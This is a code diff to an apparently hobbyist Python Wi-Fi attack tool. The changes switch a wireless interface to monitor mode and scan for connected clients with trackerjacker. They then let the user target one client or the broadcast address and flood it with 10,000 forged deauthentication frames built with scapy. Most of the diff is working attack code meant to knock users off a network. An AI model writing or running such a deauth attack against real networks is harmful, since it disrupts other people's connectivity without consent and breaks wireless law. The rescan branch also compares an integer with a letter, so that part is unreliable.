@@ -25,7 +25,7 @@ def chooseDevice():
         print(str(count) + '.' + device)
         count += 1
 
-    choice = int(input());
+    choice = int(input())
     attDevice = devicesName[choice - 1]
     return attDevice
 
@@ -45,7 +45,7 @@ def printAP(interface):
         count += 1
     return devices
 
-
+# Make device to monitor mode
 def goMonitorMode(attDevice):
     os.system("sudo -S ifconfig " + attDevice + " down")
     os.system("sudo -S iwconfig " + attDevice + " mode monitor")
@@ -92,10 +92,10 @@ def stopAttack():
     print(f.read())
 
 
-def deauth(brdmac, addr):
-    print("\nChoose interface for deauth attack")
-    interface = chooseDevice()
-    goMonitorMode(interface)
+def deauth(brdmac, addr, interface):
+    # print("\nChoose interface for deauth attack")
+    # interface = chooseDevice()
+    # goMonitorMode(interface)
     pkt = RadioTap() / Dot11(addr1 = brdmac, addr2 = addr, addr3 = addr) / Dot11Deauth()
     sendp(pkt, iface=interface, count=10000, inter=.2)
 
@@ -142,15 +142,32 @@ def printDevices(ssid):
     print("Connected divices list:\n")
     print("\033[94mSSID                  SIGNAL    VENDOR")
     counter = 1
+
+
     for device in ap.connectedDevices:
-        print(str(counter) + '. ' + device.bssid + "     " + str(device.signal) + "       " + device.vendor)
+        print(str(counter) + '. ' + device.bssid + "     " + str(device.signal) + "    " + device.vendor)
         counter += 1
+    print(str(counter) + ". ff:ff:ff:ff:ff:ff (Broadcast attack)")
+
+    # deviceNum = input("Choose for device for attack or \"R\" for rescan: ")
+    # if(deviceNum == "r" or deviceNum == "R"):
+    #     printDevices(ssid)
+
     os.system("rm wifi_map.yaml")
     print("\n\n\n")
-    return ap
+    return ap.connectedDevices
 
 
+def chooseAttDevice(ap_list):
 
+    deviceNum = int(input("Choose for device for attack or \"R\" for rescan: ")) - 1
+
+    if(deviceNum == "r" or deviceNum == "R"):
+        printDevices(ssid)
+    elif(deviceNum == len(ap_list)):
+        return Device("ff:ff:ff:ff:ff:ff" , 0, "Broadcast")
+    else:
+        return ap_list[deviceNum]
 
 if __name__ == "__main__":
     checkFotRoot()
@@ -158,9 +175,16 @@ if __name__ == "__main__":
     ap = apRescanHandler(apDevice)
     ssid = ap[0]
     addr = ap[1]
-    startAP(ssid, apDevice)
-    os.system('trackerjacker -i ' + apDevice + ' --map')
-    printDevices(ssid)
-    brdmac = "ff:ff:ff:ff:ff:ff"
-    deauth(brdmac, addr)
+    # startAP(ssid, apDevice)
+
+    print("\nChoose interface for Mac scanning")
+    interface = chooseDevice()
+    goMonitorMode(interface)
+    os.system('trackerjacker -i ' + interface + ' --map')
+
+    mac_list = printDevices(ssid)
+    x = chooseAttDevice(mac_list)
+
+
+    deauth(x.bssid, addr, interface)
     stopAttack()
